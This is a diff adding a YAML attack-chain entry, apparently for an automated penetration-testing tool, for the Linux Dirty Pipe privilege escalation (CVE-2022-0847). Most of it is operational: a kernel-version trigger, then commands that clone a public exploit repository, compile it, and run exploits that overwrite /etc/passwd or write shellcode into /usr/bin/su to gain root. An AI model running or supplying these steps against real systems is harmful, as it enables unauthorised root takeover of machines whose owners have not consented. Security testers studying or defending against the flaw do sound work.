@@ -1,0 +1,40 @@
+chain_id: dirty_pipe_cve_2022_0847
+title: "Linux privesc — CVE-2022-0847 Dirty Pipe (kernel pipe buffer)"
+severity: CRITICAL
+tags: [linux, privesc, dirty-pipe, kernel, cve-2022-0847]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)linux.*5\\.[8-9]|linux.*5\\.1[0-6]" }
+
+description: |
+  Dirty Pipe (CVE-2022-0847) lets any local user write into any
+  read-only file mapped by the page cache, including SUID binaries.
+  Affects Linux 5.8 → 5.16.10 / 5.15.24 / 5.10.101. The reliable
+  exploitation overwrites /etc/passwd to remove root's password
+  prompt, or splices a payload into /usr/bin/su.
+
+steps:
+  - id: 1
+    title: "Confirm the kernel range"
+    command: uname -r
+
+  - id: 2
+    title: "Drop the canonical PoC and run"
+    command: |
+      git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+      cd CVE-2022-0847-DirtyPipe-Exploits
+      ./compile.sh
+      ./exploit-1   # overwrites /etc/passwd
+
+  - id: 3
+    title: "If exploit-1 fails, try the SUID-binary variant"
+    command: ./exploit-2   # writes shellcode to /usr/bin/su
+
+  - id: 4
+    title: "Verify root"
+    command: id
+
+references:
+  - https://dirtypipe.cm4all.com/
+  - https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
